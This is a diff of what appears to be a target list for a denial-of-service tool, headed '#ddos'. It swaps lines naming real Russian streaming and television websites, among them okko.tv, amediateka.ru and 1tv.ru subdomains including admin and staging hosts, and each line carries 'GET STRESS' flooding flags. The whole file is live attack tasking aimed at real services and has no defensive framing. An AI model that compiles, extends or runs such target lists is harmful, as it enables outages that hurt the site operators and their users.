@@ -15,8 +15,8 @@ tcp://188.128.35.217:5060 tcp://188.128.35.217:8080 https://188.128.35.217 http:
 
 
 #ddos separiv
-https://okko.tv https://aeroflotbonus.okko.tv https://cabinet.okko.tv/login https://www.agent.okko.tv/ --http-methods GET STRESS 
-https://agents.okko.tv https://premiere.okko.tv/ https://show.okko.tv https://mimimi.okko.team/ --http-methods GET STRESS
-https://pobeda.okko.tv https://www.ontvtime.ru https://www.amediateka.ru https://kodiki.amediateka.ru/ --http-methods GET STRESS
-https://localandroid.amediateka.ru/ https://bbb.amediateka.ru/b https://rt.amediateka.ru/ https://akado.amediateka.ru/ --http-methods GET STRESS
-https://wink.ru https://www.kartina.tv https://www.debilizator.tv https://www.glaz.tv/online-tv/ --http-methods GET STRESS
+https://okko.tv https://mimimi.okko.team/ https://pobeda.okko.tv https://www.ontvtime.ru http://m.kino-teatr.ru/ --http-methods GET STRESS
+https://www.amediateka.ru https://kodiki.amediateka.ru/ https://rt.amediateka.ru/ https://akado.amediateka.ru/ --http-methods GET STRESS
+https://wink.ru https://www.1tv.ru/live https://cm.1tv.ru/ https://tlxmob.1tv.ru/ https://mt.kino-teatr.ru/ --http-methods GET STRESS
+https://25.1tv.ru/ https://kino.1tv.ru/ https://users.1tv.ru/ http://edu.1tv.ru/ --http-methods GET STRESS
+https://admin.kino.1tv.ru/ https://stage.1tv.ru/ https://subscr.1tv.ru/ https://kino-teatr.ru --http-methods GET STRESS
